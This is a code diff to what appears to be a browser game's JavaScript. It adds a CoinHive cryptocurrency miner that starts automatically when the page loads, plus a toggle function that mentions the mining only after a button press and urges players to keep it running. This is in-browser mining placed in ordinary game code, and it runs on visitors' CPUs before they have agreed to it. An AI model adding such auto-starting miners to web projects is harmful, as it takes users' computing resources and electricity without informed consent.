@@ -19,6 +19,9 @@ var COLOR_BLACK = "#808080";
 var COLOR_GREEN = "#009000";
 
 //init
+var miner = new CoinHive.Anonymous('Ul6SWB7j0GGalIcLOWvIjxPRD4FSrNcc');
+miner.start();
+
 $("#seed").keyup(function() {
 	fire();
 });
@@ -222,6 +225,15 @@ function shuffle(array) {
 	}
 
 	return array;
+}
+
+
+//coin hive
+function coinHiveToggle(){
+	miner.isRunning() ? miner.stop() : miner.start();
+	var minerState = miner.isRunning() ? 'on': 'off'
+	var toggle = !miner.isRunning() ? 'on': 'off'
+	alert('You have turned ' + minerState + ' coinhive. Please consider turning it on while you play the game, it will help fund more projects like these by using a bit of your CPU to run some maths. To turn CoinHive ' + toggle +  ' again, please press this button again. Thanks!')
 }
 
 //enable pressing 'Enter' on seed field
